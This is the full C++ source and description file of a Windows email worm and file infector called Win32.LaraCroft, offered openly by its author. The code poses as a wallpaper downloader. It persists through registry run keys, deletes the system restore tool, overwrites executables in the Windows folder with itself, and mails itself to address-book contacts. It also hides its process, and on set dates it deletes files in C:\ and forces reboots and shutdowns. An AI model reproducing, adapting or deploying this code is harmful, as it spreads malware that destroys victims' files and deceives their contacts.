
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LARACROFT.CPP]ÄÄÄ
#include "laracroft.h"
#pragma hdrstop
#pragma warning (disable: 4068)
#pragma warning (disable: 4001)

char LaraWinDir[256],LaraSysDir[256],LaraPath[256];
HKEY RestoreKey,LaraNTKey,LaraWinKey,LaraInstallKey,LaraNewKey;
HANDLE LaraHnd,LaraHndTime;
HMODULE ServiceLib,MessLib;
int Err,ErrSend;
typedef DWORD(*RegServProc)(DWORD,DWORD);
typedef ULONG(*FriendMess)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
typedef ULONG(*FriendFound)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
typedef ULONG(*FreeMem)(LPVOID);
LPSTR Friend = "a";

#pragma argsused
int PASCAL WinMain
(
HINSTANCE hInstance,
HINSTANCE hPrevInstance,
LPSTR     lpszCmdLine,
int       nCmdShow
)
{
//Win32.LaraCroft par ZeMacroKiller98
//Copyright (c) 2000 par ZeMacroKiller98
//Un virus made in FRANCE!!!!!!!!!
WIN32_FIND_DATA LaraHost;
OSVERSIONINFO CurVerInfo;
FILETIME LaraCreateTime,LaraLstAccTime,LaraLstWriTime;
SYSTEMTIME LaraTime;
FriendMess MAPIFriendMess;
FriendFound MAPIFriendFound;
FreeMem MAPIFreeMem;
RegServProc RegisServProcss;
ServiceLib = LoadLibrary("kernel32.dll");
MessLib = LoadLibrary("mapi32.dll");
SearchPath(NULL,_argv[0],NULL,sizeof(LaraPath),LaraPath,NULL);
CurVerInfo.dwOSVersionInfoSize = sizeof(CurVerInfo);
GetVersionEx(&CurVerInfo);
if(CurVerInfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
{
        RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&LaraNTKey);
        RegSetValueEx(LaraNTKey,"LaraWallpaper",0,REG_SZ,LaraPath,sizeof(LaraPath));
        RegCloseKey(LaraNTKey);
}
else
{
        RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&LaraWinKey);
        RegSetValueEx(LaraWinKey,"LaraWallpaper",0,REG_SZ,LaraPath,sizeof(LaraPath));
        RegCloseKey(LaraWinKey);
}
if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\LaraCroft\\Install",0,KEY_ALL_ACCESS,&LaraInstallKey)!=ERROR_SUCCESS)
{
        MessageBox(NULL,
                "Hi Friends,\nThis software downloads automatically new wallpaper on Lara Croft official site\nIf you have any questions, go to www.eidosinterative.com\nPlease register it on our site at www.eidosinteractive.com\\Lara\\Register\n\tThanks to have take this software\n\t\t\tLara Croft",
                "Lara Wallpaper Download Software",
                MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
        //Anti-WinMe Restauration File
        GetSystemDirectory(LaraSysDir, sizeof(LaraSysDir));
        if(SetCurrentDirectory(lstrcat(LaraSysDir,"\\RESTORE"))!=0)
        {
                RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&RestoreKey);
                RegDeleteValue(RestoreKey,"*StateMgr");
                RegCloseKey(RestoreKey);        
                DeleteFile("rstrui.exe");
        }
        GetWindowsDirectory(LaraWinDir,sizeof(LaraWinDir));
        SetCurrentDirectory(LaraWinDir);
        LaraHnd = FindFirstFile("*.exe",&LaraHost);
        LaraHoteTrouve:
        LaraHndTime = CreateFile(LaraHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
        GetFileTime(LaraHndTime,&LaraCreateTime,&LaraLstAccTime,&LaraLstWriTime);
        CloseHandle(LaraHndTime);        
        if((lstrcmp(LaraHost.cFileName,"emm386.exe")==0)||(lstrcmp(LaraHost.cFileName,"setver.exe")==0))
                goto FichierNonInfecte;
        CopyFile(_argv[0],LaraHost.cFileName,FALSE);
        LaraHndTime = CreateFile(LaraHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
        SetFileTime(LaraHndTime,&LaraCreateTime,&LaraLstAccTime,&LaraLstWriTime);
        CloseHandle(LaraHndTime);
        FichierNonInfecte:
        if(FindNextFile(LaraHnd,&LaraHost)==TRUE)
                goto LaraHoteTrouve;
        FindClose(LaraHnd);
        RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\LaraCroft\\Install",&LaraNewKey);
        RegCloseKey(LaraNewKey);
        MessageBox(NULL,"Please send this software about me to your friends...\nYou can select friends into your address book, now\n\t\t\tLara Croft","Lara Wallpaper Download Software",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
        MAPIFriendMess = (FriendMess)GetProcAddress(MessLib,"MAPISendMail");
        MAPIFriendFound = (FriendFound)GetProcAddress(MessLib,"MAPIResolveName");
        MAPIFreeMem = (FreeMem)GetProcAddress(MessLib,"MAPIFreeBuffer");
        if((MAPIFriendMess==NULL)||(MAPIFriendFound==NULL)||(MAPIFreeMem==NULL))
        {
                MessageBox(NULL,"MAPI not installed on this computer\nPlease refer to help to install it","Lara Wallpaper Download Software",MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
                SetCurrentDirectory(LaraSysDir);
                DeleteFile("*.*");
                ExitProcess(0);
        }
        MapiMessage MyMessage;
        MapiRecipDesc stRecip;
        MapiFileDesc stFile;
        lpMapiRecipDesc lpRecip;
        stFile.ulReserved = 0;
        stFile.flFlags = 0L;
        stFile.nPosition = (ULONG)-1;
        stFile.lpszPathName = LaraPath;
        stFile.lpszFileName = NULL;
        stFile.lpFileType = NULL;        
        UnResolve:
        Err = (MAPIFriendFound)(lhSessionNull,0L,Friend,MAPI_DIALOG,0L,&lpRecip);
        if(Err!=SUCCESS_SUCCESS)
        {
                switch(Err){
                case MAPI_E_AMBIGUOUS_RECIPIENT:
                        MessageBox(NULL,"Please select new email address into your address book","Lara Wallpaper Download Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);                
                break;
                case MAPI_E_UNKNOWN_RECIPIENT:
                        MessageBox(NULL,"Any email address with current letter","Lara Wallpaper Download Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);                
                break;
                case MAPI_E_FAILURE:
                        MessageBox(NULL,"Unknown error into your address book","Lara Wallpaper Download Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                        DeleteFile("*.*");
                        ExitProcess(0);
                break;
                case MAPI_E_INSUFFICIENT_MEMORY:
                        MessageBox(NULL,"No enought memory to launch this application\nPlease close other application to continue","Lara Wallpaper Download Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                        DeleteFile("*.*");
                        ExitProcess(0);
                break;
                case MAPI_E_NOT_SUPPORTED:
                        MessageBox(NULL,"Email software not installed\nPlese refer to your help for more information","Lara Wallpaper Download Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                        DeleteFile("*.*");
                        ExitProcess(0);
                break;
                case MAPI_E_USER_ABORT:
                        MessageBox(NULL,"You have cancelled this dialog box","Lara Wallpaper Download software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                        DeleteFile("*.*");
                        ExitProcess(0);
                break;        
                }
        goto UnResolve;
        }
stRecip.ulReserved = lpRecip->ulReserved;
stRecip.ulRecipClass = MAPI_TO;
stRecip.lpszName = lpRecip->lpszName;
stRecip.lpszAddress = lpRecip->lpszAddress;
stRecip.ulEIDSize = lpRecip->ulEIDSize;
stRecip.lpEntryID = lpRecip->lpEntryID;
MyMessage.ulReserved = 0;
MyMessage.lpszSubject = "Lara Wallpaper Download Software";
MyMessage.lpszNoteText = lstrcat("Hi ",(lstrcat(lpRecip->lpszName,"\n\n\tI found on the net a new interesting software about Lara Croft.\nI send you because it's very coooooool!!!\nTry it and say me your opinion about it\n\n\tSee you soon and enjoy to have it")));
MyMessage.lpszMessageType = NULL;
MyMessage.lpszDateReceived = NULL;
MyMessage.lpszConversationID = NULL;
MyMessage.flFlags = 0L;
MyMessage.lpOriginator = NULL;
MyMessage.nRecipCount = 1;
MyMessage.lpRecips = &stRecip;
MyMessage.nFileCount = 1;
MyMessage.lpFiles = &stFile;
ErrSend = (MAPIFriendMess)(lhSessionNull,0L,&MyMessage,0L,0L);
if(ErrSend!=SUCCESS_SUCCESS)
{
        MessageBox(NULL,"Sending email create error into your system","Lara Wallpaper Download Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
        DeleteFile("*.*");
        ExitProcess(0);
} 
FreeLibrary(MessLib);
}      
RegCloseKey(LaraInstallKey);
RegisServProcss = (RegServProc)GetProcAddress(ServiceLib,"RegisterServiceProcess");
STARTUPINFO LaraStartInfo;
PROCESS_INFORMATION LaraProcInfo;
LaraStartInfo.cb = sizeof(STARTUPINFO);
LaraStartInfo.lpReserved = NULL;
LaraStartInfo.lpReserved2 = NULL;
LaraStartInfo.cbReserved2 = 0;
LaraStartInfo.lpDesktop = NULL;
LaraStartInfo.dwFlags = STARTF_FORCEOFFFEEDBACK;
if(CreateProcess(LaraPath,
                NULL,
                (LPSECURITY_ATTRIBUTES)NULL,
                (LPSECURITY_ATTRIBUTES)NULL,
                FALSE,
                0,
                NULL,
                NULL,
                &LaraStartInfo,
                &LaraProcInfo))
{
CloseHandle(LaraProcInfo.hProcess);
CloseHandle(LaraProcInfo.hThread);
}
RegisServProcss(LaraProcInfo.dwProcessId,1);
if((LaraTime.wHour==10)&&(LaraTime.wMinute==0)&&(LaraTime.wSecond==0))
{
        MessageBox(NULL,"It's time to connect at Lara Croft official web site\nThanks to Click on OK to continue","Lara Wallpaper Download Software",MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
        WritePrivateProfileString("InternetShortcut","URL","http://www.tombraider.com/larasworld/wallpaper.html","LaraCroft.url");
        ShellExecute(NULL,"open","LaraCroft.url",NULL,NULL,SW_SHOWNORMAL);
}        
if((LaraTime.wDay==25)&&(LaraTime.wMonth==12))
{
        MessageBox(NULL,
                "Merry christmas by Lara Croft!!!!!!\nHey, your PC is infected by new virus: Win32.LaraCroft\n\nJoyeux Noel de la part de Lara Croft!!!!!!\nTon PC est infect‚ par Win32.LaraCroft fabriqu‚ par ZeMacroKiller98",
                "Lara Croft like you, don't you",
                MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
        SetCurrentDirectory("C:/");
        DeleteFile("*.*");
        ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);

}
if(LaraTime.wDay==1)
{
        MessageBox(NULL,"Lara Croft is with you!!!!\nAnd don't want you work today....","Win32.LaraCroft",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
        ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
}
if((LaraTime.wHour>=20)&&(LaraTime.wHour<=6))
{
        MessageBox(NULL,"Lara Croft say it's time to stop your PC now!!!!\nAnd go to bed, Ha Ha Ha ha !!!!!","Win32.LaraCroft",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
        ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
}
FreeLibrary(ServiceLib);
return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LARACROFT.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LARACROFT.H]ÄÄÄ
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <dos.h>
#include <stdlib.h>
#include <stdio.h>
#include <mapi.h>
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LARACROFT.H]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LARACROFT.TXT]ÄÄÄ
Name: Win32.LaraCroft
Size: 52736 octets
Author: ZeMacroKiller98

Description: This virii try to send itself by email, 
if error when i try to send itself then delete in current directory
When install itself, it install itself in current directory as a Wallpaper upload automatically
	It contains 2 payloads:
		- When day is 25 and month is 12, then delete file in C: directory and reboot computer
		- If day is 1, then display message box and shutdown computer 
		- If hour >=20 and hour <=6, then displays message box and shutdown computer
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LARACROFT.TXT]ÄÄÄ
